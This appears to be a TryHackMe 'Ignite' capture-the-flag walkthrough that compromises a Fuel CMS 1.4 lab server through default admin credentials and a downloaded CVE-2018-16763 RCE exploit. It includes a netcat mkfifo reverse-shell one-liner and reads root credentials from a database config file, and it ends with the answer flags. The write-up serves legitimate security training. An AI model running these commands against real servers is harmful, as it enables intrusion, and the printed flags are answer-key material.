
# Ignite CTF Walkthrough

Ignite is a vulnerable new start up with issues in their web server on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/ignite<br />
THM Difficulty: Easy<br />
My Difficulty: Easy<br />
Target IP: 10.10.105.97<br />
AttackBox IP: 10.10.189.128<br />
</i>

# Recon

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```rustscan -a 10.10.105.97```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flag -sV to find the service versions on the open port.<br />
```nmap -sV -p80 10.10.105.97```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT2.png?raw=true)<br />
We have only found one service, this CTF may just be a webservice. Let's try to find some vulnerabilities!

## HTTP Service Recon

Let's load up our web browser and head over to http://10.10.105.97/<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT3.png?raw=true)<br />
Straight away we see the name "Fuel CMS" and a version "Version 1.4". Let's see what else we can find.
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT4.png?raw=true)<br />
Further down the webpage we see the link to an admin page and a default login, let's try logging in!
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT5.png?raw=true)<br />
Success! We've managed to login to the admin panel with the default username and password. Let's check the search engines for Fuel CMS 1.4 to see if we can find any vulnerabilities.<br />

Another hit! We see an exploit-db result that affects Fuel CMS versions 1.41 and below. CVE-2018-16763, remote Code Execution.
Now we have two ways we can go, using the exploit we found or to try upload a reverse shell on the admin panel.<br />

## Exploiting Fuel CMS 1.41
We're going to try the first way... Using the exploit we found! Why not?<br />
First let's download the exploit onto our AttackBox - https://www.exploit-db.com/raw/50477<br />
I downloaded it and named it exploit.py, let's run it and see if we can get a shell! This exploit requires no additional configuration.<br />
```python exploit.py```<br />
It tells us we need to add the -u flag with the URL! Let's go.<br />
```python exploit.py -u http://10.10.105.97```<br />
If the exploit was succesful you will be asked to enter a command like I've done below<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT6.png?raw=true)<br />
It looks like the exploit executes PHP system commands, let's get a reverse shell up for more functionality. To do this 
we'll need to firstly open up a listener on our AttackBox, then we will send the PHP system command to spawn a reverse shell to that listener.<br />
On our AttackBox:<br />
```nc -lvnp 8888```<br />
<br />
On our target with the PHP system commands:<br />
```rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.189.128 8888 >/tmp/f```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT7.png?raw=true)<br />
Now we have our reverse shell opened! Let's have a look in /home<br />
```cd /home```<br />
```ls```<br />
We see another folder www-data, after checking inside the folder we find a flag.txt, this must be our User flag!<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT8.png?raw=true)<br />
After having a look around it looks like we'll need to escalate our privileges to get any further!<br />

## Privilege Escalation

Let's start looking for ways to escalate our privileges!
```uname -a ```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT9.png?raw=true)<br />
4.15.0-45-generic is the version of our kernel, after looking there is an exploit but it requires us to have newuidmap which we do not have.<br />
Let's continue looking...<br />
```sudo -l```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT10.png?raw=true)<br />
No luck. I continued searching for a while then went back to see if I had missed something.<br />
After going back to the website I noticed this:
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT11.png?raw=true)<br />
Let's have a look in the directory to see if there is any login information! Now we go back to our shell and use the following commands:<br />
```cd /var/www/html/fuel/application/config/```<br />
```cat database.php```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT13.png?raw=true)<br />
Bingo! We see a login for the user root! Let's try using this password on the target system. First we'll need to get a more stable shell...<br />
We should of done this at the start, whoops! Let's use Python:<br />
```python -c 'import pty;pty.spawn("/bin/bash")'```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT14.png?raw=true)<br />
Now we have a more stable shell let's try logging into the account we got from the database.php<br />
```su root```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT15.png?raw=true)<br />
After entering the password we're in! Let's find the final flag.<br />
```cd /root```<br />
```cat root.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Ignite/screenshots/SCREENSHOT16.png?raw=true)<br />

## Questions & Answers

Question 1:<br />
**What is the user flag?** 6470e394cbf6dab6a91682cc8585059b<br />

Question 2:<br />
**What is the root flag?** b9bbcb33e11b80be759c4e844862482d<br />

### Farewell, I hope you all enjoyed this write-up!

